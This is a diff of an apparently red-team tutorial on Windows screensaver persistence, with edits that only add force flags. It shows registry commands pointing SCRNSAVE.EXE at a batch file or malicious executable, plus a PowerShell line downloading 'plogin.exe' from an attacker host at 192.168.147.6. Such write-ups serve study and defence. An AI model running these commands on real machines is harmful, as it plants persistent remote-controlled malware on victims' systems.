@@ -59,10 +59,10 @@ echo msg %username% You are Pwned! >> C:\Windows\Temp\pwn.bat
 You may also use powershell script with below:
 
 ```powershell
-New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaveTimeOut' -Value '10'
-New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaveActive' -Value '1'
-New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaverIsSecure' -Value '0'
-New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'SCRNSAVE.EXE' -Value 'C:\Windows\Temp\pwn.bat'
+New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaveTimeOut' -Value '10' -Force
+New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaveActive' -Value '1' -Force
+New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaverIsSecure' -Value '0' -Force
+New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'SCRNSAVE.EXE' -Value 'C:\Windows\Temp\pwn.bat' -Force
 ```
 
 Once the registry changed, you may use command below to verify registry:
@@ -74,10 +74,10 @@ reg query "HKCU\Control Panel\Desktop" /s
 If you want to remove the artifacts of registry, you can use powershell or normal dos command below:
 
 ```powershell
-Remove-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaveTimeOut'
-Remove-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaveActive'
-Remove-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaverIsSecure'
-Remove-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'SCRNSAVE.EXE'
+Remove-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaveTimeOut' -Force
+Remove-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaveActive' -Force
+Remove-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaverIsSecure' -Force
+Remove-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'SCRNSAVE.EXE' -Force
 ```
 
 ```batch
@@ -90,7 +90,7 @@ reg delete Registry_key_path /v SCRNSAVE.EXE /f
 Adversaries may use tools such as Sliver C2 implants/beacon, reverse shell from msfvenom or even simple socat/powershell to callback to attacker machines. Simply added line below to download the malicious executable and change the path of “SCRNSAVE.EXE“ to malicious executable.
 
 ```batch
-reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /d C:\Windows\Temp\plogin.exe
+reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /d C:\Windows\Temp\plogin.exe /f
 
 powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.147.6/plogin.exe', 'C:\Windows\Temp\plogin.exe')"
 ```
